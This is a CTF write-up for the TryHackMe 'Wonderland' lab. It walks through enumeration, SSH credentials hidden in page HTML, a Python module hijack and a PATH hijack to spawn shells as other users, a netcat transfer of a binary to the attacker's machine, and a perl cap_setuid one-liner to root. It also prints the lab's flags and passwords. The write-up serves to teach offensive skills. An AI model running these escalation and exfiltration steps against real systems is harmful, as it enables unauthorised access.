---
title: "[TryHackMe] Wonderland"
author: Tri Nguyen
date: 2021-11-21 17:00:00 -0700
categories: [CTF, Write Up]
tags: [ctf, write-up, tryhackme, wonderland, thm]
---

IP: 10.10.143.221

# Enumeration

## Gobuster

- Nothing special...

```shell
┌──(kali㉿kali)-[~/Desktop/thm/wonderland]
└─$ gobuster dir --url 10.10.143.221 -w /opt/seclists/Discovery/Web-Content/common.txt                                                   1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.143.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/21 17:53:24 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]  
/r                    (Status: 301) [Size: 0] [--> r/]  
/render/https://www.google.com (Status: 301) [Size: 0] [--> /render/https:/www.google.com]
                                                                                          
===============================================================
2021/11/21 17:54:50 Finished
===============================================================
```

## Nmap

- We need to gain some information before SSH I think.

```shell
┌──(kali㉿kali)-[~/Desktop/thm/wonderland]
└─$ sudo nmap -p- -sV -sS 10.10.143.221 | tee nmap.txt
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-21 17:51 EST
Nmap scan report for 10.10.143.221
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 904.22 seconds
```

## Others:

- OWASP ZAP crawling doesn't return anything useful.

- `exif` & `binwalk` the pictures in the `/img/` directories.

## Next steps:

- Actually, I went to `IP/r` and there is some other texts!

- Eventually I got to `IP/r/a/b/b/i/t`

- I tried to gobuster it a bit more but seems like it's the end.

- Inspecting the web page you receive what possibly be the SSH credentials!

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

- `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

# SSH

## Alice

```shell
alice@wonderland:~$ ls -la
total 40
drwxr-xr-x 5 alice alice 4096 Nov 21 23:20 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

- Nothing major concern even after running linpeas since most exploit requires gcc.

```shell
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

- So you can run the walrus file with rabbit privilege but you can't edit the file. Hmm.

- Notice that the file `import random`. 

- Running `locate random.py` points to the python library folder but we don't have any permission to edit the file there either.

- How about we create our random.py that spawn a shell? That way we can have a shell under rabbit.

```
alice@wonderland:~$ touch random.py
alice@wonderland:~$ echo "import os; os.system('/bin/sh')" > random.py
```

- Notice that these 3 commands don't work. Silly me, I should have use the EXACT command that `sudo -l` tells us to use.

```shell
# NOT WORKING
alice@wonderland:~$ sudo -u rabbit python3 walrus_and_the_carpenter.py 
Sorry, user alice is not allowed to execute '/usr/bin/python3 walrus_and_the_carpenter.py' as rabbit on wonderland.
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3 walrus_and_the_carpenter.py 
Sorry, user alice is not allowed to execute '/usr/bin/python3 walrus_and_the_carpenter.py' as rabbit on wonderland.
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py 
Sorry, user alice is not allowed to execute '/usr/bin/python3 /home/alice/walrus_and_the_carpenter.py' as rabbit on wonderland
```

- This one will work.

```shell
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
$ whoami
rabbit
```

## Rabbit

- You will see an executable call `teaParty`. However you can't examine it here because we lack tools. Notice it also has SUID and SGID bit set.

- Sending the file to our box using netcat. (SCP won't work because you don't know rabbit's password).

- Tutorial https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/

```shell
# On our box:
nc -l -p 4444 > teaParty

# On wonderland:
nc -w 3 10.2.51.175 4444 < teaParty
```

- Content of `teaParty`:

```c
void main(void)
{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

- Notice that while `echo` uses a path, `date` doesn't. We can probably hijack this.

```shell
$ echo "/bin/bash" > date
$ chmod 777 date
$ ls -la date
-rwxrwxrwx 1 rabbit rabbit 10 Nov 22 00:49 date
$ export PATH=/home/rabbit:$PATH
$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
```

## Hatter

```shell
hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
hatter@wonderland:/home/hatter$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
```

- So now we are provide with a password for Hatter. But we can't run sudo.

- Last is `Capabilities` privesc. Checked my notes & GTFObins ;)

```shell
hatter@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```

## root

```shell
# cd alice
# cat root.txt  
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
# cat /root/user.txt
thm{"Curiouser and curiouser!"}
```